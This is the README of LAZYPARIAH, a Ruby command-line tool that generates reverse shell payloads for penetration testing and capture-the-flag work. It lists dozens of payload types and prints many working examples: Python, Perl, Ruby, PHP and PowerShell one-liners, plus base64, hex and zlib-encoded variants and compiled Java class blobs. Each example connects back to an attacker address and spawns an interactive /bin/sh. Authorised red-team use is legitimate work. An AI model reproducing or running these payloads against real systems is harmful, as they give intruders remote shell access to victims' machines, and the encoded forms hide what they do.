# LAZYPARIAH
A low-dependency command-line tool for generating reverse shell payloads on the fly.

![Alt text](./lazypariah.svg)

## Description
LAZYPARIAH is a simple and easily installable command-line tool written in pure Ruby that can be used during penetration tests and capture-the-flag (CTF) competitions to generate a range of reverse shell payloads on the fly.

The reverse shell payloads that LAZYPARIAH supports include (but are not limited to):

* C binary payloads (compiled on the fly): `c_binary`
* Ruby payloads: `ruby`, `ruby_b64`, `ruby_hex`, `ruby_c`
* Powershell payloads: `powershell_c`, `powershell_b64`
* Base64-encoded Python payloads: `python_b64`
* Rust binary payloads (compiled on the fly): `rust_binary`
* PHP scripts containing base64-encoded Python payloads called via the `system()` function: `php_system_python_b64`
* Java classes (compiled on the fly): `java_class`
* Perl payloads: `perl`, `perl_b64`, `perl_hex`, `perl_c`
* Simple PHP payloads (targeting specific file descriptors): `php_fd`, `php_fd_c`, `php_fd_tags`

## Warning
This tool is intended to be used only in authorised circumstances by qualified penetration testers, security researchers and red team professionals. Before downloading, installing or using this tool, ensure that you understand the relevant laws in your jurisdiction. The author of this tool does not endorse, encourage or condone the use of this tool for illegal or unauthorised purposes.

## Dependencies
* Ruby >= 2.7.1 (LAZYPARIAH has not been tested on previous versions of Ruby)
* OpenJDK (Optional: Only required for `java_class` payloads.)
* GCC (Optional: Only required for `c_binary` payloads.)
* Rust (Optional: Only required for `rust_binary` payloads.)

## Installation
LAZYPARIAH can be installed on most GNU/Linux and BSD systems using the RubyGems installer as follows:
```
gem install lazypariah
```

## Usage
```
Usage:	lazypariah [OPTIONS] <PAYLOAD TYPE> <ATTACKER HOST> <ATTACKER PORT>
Note:	<ATTACKER HOST> may be an IPv4 address, IPv6 address or hostname.

Example:	lazypariah -u python_b64 10.10.14.4 1555
Example:	lazypariah python_c malicious.local 1337

Valid Payloads:
    awk
    bash_tcp
    c_binary
    java_class
    nc
    nc_openbsd
    nc_pipe
    nodejs
    nodejs_b64
    nodejs_c
    nodejs_hex
    perl
    perl_b64
    perl_c
    perl_hex
    php_fd
    php_fd_c
    php_fd_tags
    php_system_python_b64
    php_system_python_hex
    php_system_python_ipv6_b64
    php_system_python_ipv6_hex
    powershell_b64
    powershell_c
    python
    python_b64
    python_c
    python_hex
    python_ipv6
    python_ipv6_b64
    python_ipv6_c
    python_ipv6_hex
    ruby
    ruby_b64
    ruby_c
    ruby_hex
    rust_binary
    socat

Valid Options:
    -h, --help                       Display help text and exit.
    -l, --license                    Display license information and exit.
    -u, --url                        URL-encode the payload.
    -v, --version                    Display version information and exit.
    -D, --fd INTEGER                 Specify the file descriptor used by the target for TCP. Required for certain payloads.
    -P, --pv INTEGER                 Specify Python version for payload. Must be either 2 or 3. By default, no version is specified.
    -N, --no-new-line                Do not append a new-line character to the end of the payload.
        --b64                        Encode a c_binary, rust_binary or java_class payload in base-64.
        --hex                        Encode a c_binary, rust_binary or java_class payload in hexadecimal.
        --gzip                       Compress a c_binary, rust_binary or java_class payload using zlib.
        --gzip_b64                   Compress a c_binary, rust_binary or java_class payload using zlib and encode the result in base-64.
        --gzip_hex                   Compress a c_binary, rust_binary or java_class payload using zlib and encode the result in hexadecimal.
```

## Further Notes and Examples
The payloads listed above are more-or-less systematically named.

Payloads ending with `_c` are intended to be executed from within a shell session. These payloads execute code directly using the relevant interpreter (e.g. `python3 -c` or `ruby -e`).

For example, the command `lazypariah python_c 10.10.14.4 1337` should produce the following output:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

The command `lazypariah python 10.10.14.4 1337`, on the other hand, should simply produce a block of Python code which could potentially be placed in a `.py` file:
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Generally speaking, selecting payloads ending with `_b64` should produce a command intended to be run from within a shell session in a similar manner to payloads ending with `_c`, but the commands will be different in structure. These commands will essentially pipe a base64-encoded block of code through to `base64 -d` and then on through to the relevant interpreter (such as `python3`, `python2` or `ruby`).

For example, the command `lazypariah python_b64 10.10.14.4 1337` should produce the following output:
```
echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw== | base64 -d | python
```

The exception to this is `powershell_b64`, which uses Powershell's inbuilt base64 decoder. The command `lazypariah powershell_b64 10.10.14.4 1337`, for instance, should return the following:
```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANAAnACwAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

(Note: The length of the above payload is due to the fact that Powershell uses UTF-16LE encoding, where a single character corresponds to two bytes.)

These types of payloads can be useful in certain situations because they do not include any single or double quotes.

In a similar manner, selecting payloads ending with `_hex` will produce a command that pipes a hexadecimal-encoded block of code through to `xxd -p -r -` and then on through to the relevant interpreter. For example, `lazypariah perl_hex 10.10.14.4 1337` should produce the following output:
```
echo 75736520536f636b65743b24693d2231302e31302e31342e34223b24703d313333373b736f636b657428532c50465f494e45542c534f434b5f53545245414d2c67657470726f746f62796e616d6528227463702229293b696628636f6e6e65637428532c736f636b616464725f696e2824702c696e65745f61746f6e282469292929297b6f70656e28535444494e2c223e265322293b6f70656e285354444f55542c223e265322293b6f70656e285354444552522c223e265322293b6578656328222f62696e2f7368202d6922293b7d3b | xxd -p -r - | perl
```

Compiled payloads (`c_binary`, `java_class` and `rust_binary`) have optional command-line arguments for zlib compression (`--gzip`), base64-encoding (`--b64`) and hexadecimal-encoding (`--hex`).

For example, the command `lazypariah --b64 java_class 10.10.14.4 1337` should produce the following output:

```
yv66vgAAADcAXwoAHQApBwAqBwArCAAsCgACAC0KAAIALgoAAgAvBwAwCAAxCgAIADIKACMAMwoAIwA0CgAIADMKACMANQoACAA1CgAIADYKACQANwoAJAA4CgAlADkKACUAOgUAAAAAAAAAMgoAOwA8CgAjAD0HAD4KACMAPwoACABABwBBBwBCAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAEMHAEQHAEUBAApFeGNlcHRpb25zAQAKU291cmNlRmlsZQEAB3JzLmphdmEMAB4AHwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoDAAeAEYMAEcASAwASQBKAQAPamF2YS9uZXQvU29ja2V0AQAKMTAuMTAuMTQuNAwAHgBLDABMAE0MAE4ATQwATwBQDABRAFIMAFMAVAwAVQBUDABWAFcMAFgAHwcAWQwAWgBbDABcAFQBABNqYXZhL2xhbmcvRXhjZXB0aW9uDABdAB8MAF4AHwEAAnJzAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAFGphdmEvaW8vT3V0cHV0U3RyZWFtAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAA5nZXRFcnJvclN0cmVhbQEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGlzQ2xvc2VkAQADKClaAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEABXdyaXRlAQAEKEkpVgEABWZsdXNoAQAQamF2YS9sYW5nL1RocmVhZAEABXNsZWVwAQAEKEopVgEACWV4aXRWYWx1ZQEAB2Rlc3Ryb3kBAAVjbG9zZQAhABwAHQAAAAAAAQABAB4AHwACACAAAAEAAAYACQAAALAqtwABuwACWQS9AANZAxIEU7cABQS2AAa2AAdMuwAIWRIJEQU5twAKTSu2AAtOK7YADDoELLYADToFK7YADjoGLLYADzoHLLYAEJoAXS22ABGeAA8ZBy22ABK2ABOn//AZBLYAEZ4AEBkHGQS2ABK2ABOn/+4ZBbYAEZ4AEBkGGQW2ABK2ABOn/+4ZB7YAFBkGtgAUFAAVuAAXK7YAGFenAAg6CKf/oiu2ABostgAbsQABAJoAnwCiABkAAgAhAAAABgABAAAAAQAiAAAAKgAH/wBGAAgHABwHACMHAAgHACQHACQHACQHACUHACUAAAYSFBRXBwAZBAAmAAAABAABABkAAQAnAAAAAgAo
```

It is also possible to perform zlib compression on one of the aforementioned compiled payloads before encoding it in either base64 or hexadecimal using the `--gzip_b64` and `--gzip_hex` command-line arguments respectively. For example, the command `lazypariah --gzip_hex java_class 10.10.14.4 1337` should produce the following output:

```
1f8b08003ca25960000375535d57125114dd83335ca0511431a53433b5f00bb42c13cc4ad3c2f0a3200dcd5a03dc741419d7cc50f6577ca8b57cf1b55eb095ab7e403fa6d52fc8ce0549c91aee6cced9779f7bce9939f3fdd7976f0046f0ca8336f430f432f4b9d0ef810303024202c20c832e0c79e0c2750f3a7143c0b0704bd64d6195e096075d181170db836e8c0a8828285f141ac59808b8c3302efeef8a987b0cf719262438c7f4bc6e8f4ba809f62c4a90278d2c97e08deb793e57d84a7333a9a573c4d4266c2db339ab6d977c864986070c53123c533b19be6deb46de22276114cc0c9fd6450833add086f646537109ed125a841dce69f9b5f0826964b8654d14f45c969b12ea4fb612b6a9e7d728389cd6f3616b5d044fab7888472a6298a1d24ada3cb7c30923b3c96d4a3a3418126b38342cd48f55c431ab624ec03c16543cc153150924553c13b0882515cfd1ce9052b18c15152f9094d07852c49f9654aca25dc54b51bfc3b4aa2a9d4f6ff00ca56f38d357e52cdd08c7f2db059b7ae2da96047f859d2fd8a7e8f3c195f8df0f202a5e46a3c9b3ba4949a64cd3302bf2b6e0724ffc7fcf322a41b16ccda4ba9a82ff904545bab3d962225ddd1ab7abea6dae9c50dd48b42cad2aca4b4475572da7824fef50b44bb7267386c5b3a5a95b96e0269d9e2b0f1a31319a4392d2b6f2d6d46d22e560a942e575ae60ad57bd85e4fab1d2ca71be2d943342e9e63bbabda8e50a620eb3dcb24de31d8932222d3ad04adf9db824fad170d2d776593870c24decc7de03488770a4e4afa849d5f8e4c40114b90867112c7e0857cae76e50460fe099ed2be2dc1c811a91fb8ba88d2864d7459c647b238cb07e17ab034534bc8737c0c8f015d1b87ff4332097b8fa00135699fc11508e49a7b02a242bc21fa0c47e3f9a3ea399ce6f59da872be2da3fda23e70225b9f8894adfc507ec21409d7440f42195babb42d80b768469b8185a193a9930ba2aab9b16a97d7eff124340c655d2cb1417a0fb1ad90e047f03b0d0dc15ad040000
```

Some payloads require the user to specify the file descriptor used by the target for TCP connections. One example of such a payload is `php_fd_tags`, which is a simple PHP payload enclosed within PHP tags (`<?php` and `?>`) that targets a specific file descriptor.

To specify a target file descriptor, the user must use the command line argument `-D INTEGER` or `--fd INTEGER`. For example, to generate a `php_fd_tags` payload that targets file descriptor `5`, the following command can be used:
`lazypariah -D 5 php_fd_tags 10.10.14.4 1337`

The resulting payload should be as follows:
`<?php $sock=fsockopen("10.10.14.4",1337);exec("/bin/sh -i <&5 >&5 2>&5");?>`

Below are some examples of commands and their respective outputs.

Output of command `lazypariah -P 3 -u python_b64 10.10.14.4 1337`:
```
echo%20aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw%3D%3D%20%7C%20base64%20-d%20%7C%20python3
```
Output of command `lazypariah -P 2 python_c 10.10.14.4 1337`:
```
python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Output of command `lazypariah -D 3 php_fd_tags 10.10.14.4 1337`:
```
<?php $sock=fsockopen("10.10.14.4",1337);exec("/bin/sh -i <&3 >&3 2>&3");?>
```
Output of command `lazypariah ruby 10.10.14.4 1337`:
```
require "socket";exit if fork;c=TCPSocket.new("10.10.14.4","1337");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
```

## Author
Copyright (C) 2020-2022 Peter Bruce Funnell

## License
This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.  If not, see <https://www.gnu.org/licenses/>

## Support
If you found this project useful and would like to encourage me to continue making open source software, please consider making a donation via the following link:

https://www.buymeacoffee.com/peterfunnell

Donations in Bitcoin (BTC) are also very welcome. My BTC wallet address is as follows:

```
3EdoXV1w8H7y7M9ZdpjRC7GPnX4aouy18g
```
